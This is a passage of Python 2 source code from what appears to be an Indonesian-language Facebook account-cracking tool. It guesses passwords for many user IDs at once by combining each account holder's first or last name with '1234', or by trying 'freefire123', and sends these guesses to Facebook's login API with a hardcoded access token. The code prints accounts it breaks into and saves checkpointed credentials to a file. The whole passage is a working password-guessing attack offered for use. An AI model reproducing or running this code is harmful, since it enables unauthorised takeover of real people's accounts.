																													cek = open("out/super_cp.txt","a")
																													cek.write('ID:'+ user +'pw:'+ p3 +'\n')
																													cek.close()
																													cekpoint.append(user+p3)
																												else:
																													p4 = b['first_name'] + '1234'
																													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(p4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																													q = json.load(data)
																													if 'access_token' in q:
																														print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																														print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																														print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																														print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + p4 + '\n'
																														oks.append(user+p4)
																													else:
																														if 'www.facebook.com' in q['error_msg']:
																															print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																															print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																															print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																															print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + p4 + '\n'
																														else:
																															p5 = b['last_name'] + '1234'
																															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(p5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																															q = json.load(data)
																															if 'access_token' in q:
																																print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																																print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																																print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																																print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + p5 + '\n'
																																oks.append(user+p5)
																															else:
																																if 'www.facebook.com' in q['error_msg']:
																																	print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																																	print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																																	print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																																	print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + p5 + '\n'
																																	cek = open("out/super_cp.txt","a")
																																	cek.write('ID:'+ user +'pw:'+ p5 +'\n')
																																	cek.close()
																																	cekpoint.append(user+p5)
																																else:
																																	p6 = 'freefire123'
																																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(p6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																																	q = json.load(data)
																																	if 'access_token' in q:
																																		print '\x1b[1;91m[✓] \x1b[1;92mBERHASIL'
																																		print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
																																		print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
																																		print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + p6 + '\n'
																																		oks.append(user+p6)
																																	else:
																																		if 'www.facebook.com' in q['error_msg']:
																																			print '\x1b[1;91m[✖] \x1b[1;93mCEKPOINT'
																																			print '\x1b[1;91m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
																																			print '\x1b[1;91m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
																																			print '\x1b[1;91m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + p6 + '\n'
																																			cek = open("out/super_cp.txt","a")
																																			cek.write("ID:"+ user +"pw:"+ p6 +"\n")
																																			cek.close()
																																			cekpoint.append(user + p6)
																										
																																			
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;97mTotal \033[1;92mOK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File tersimpan \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	super()
	
       
		
if __name__ == '__main__':
	siapa()
